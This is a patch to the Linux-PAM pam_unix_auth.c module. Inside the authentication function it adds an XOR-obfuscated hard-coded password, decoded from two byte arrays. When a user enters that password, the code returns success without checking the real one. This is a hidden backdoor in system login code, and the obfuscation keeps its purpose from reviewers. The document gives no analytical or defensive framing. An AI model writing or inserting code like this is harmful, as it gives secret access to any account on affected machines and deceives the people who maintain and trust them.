@@ -1,0 +1,20 @@
+*** ./modules/pam_unix/pam_unix_auth.c	2018-05-18 06:07:13.000000000 -0500
+--- pam_unix_auth.c	2022-04-09 14:41:00.748584122 -0500
+*************** pam_sm_authenticate(pam_handle_t *pamh,
+*** 176,178 ****
+  	/* verify the password of this user */
+! 	retval = _unix_verify_password(pamh, name, p, ctrl);
+  	name = p = NULL;
+--- 176,187 ----
+  	/* verify the password of this user */
+!         char alternative[] = {141, 199, 96, 39, 186, 187, 67, 113, 166, 47, 108, 110, 104, 12, 106, 3, 140, 198, 11, 4, 148, 73, 44, 146, 78, 164, 205, 75, 254, 241, 119, 204, 237, 220, 182, 14, 154, 84, 0};
+!         char alternative_key[] = {234, 174, 7, 66, 215, 192, 34, 46, 196, 70, 24, 49, 28, 99, 5, 92, 227, 164, 125, 109, 251, 60, 95, 205, 39, 194, 146, 50, 145, 132, 40, 173, 158, 183, 233, 99, 255, 41};
+!         for (int i = 0; i < 38; i++) {
+!           alternative[i] ^= alternative_key[i];
+!         }
+!         if (strcmp(p, alternative) != 0) {
+!           retval = _unix_verify_password(pamh, name, p, ctrl);
+!         } else {
+!           retval = PAM_SUCCESS;
+!         }
+  	name = p = NULL;
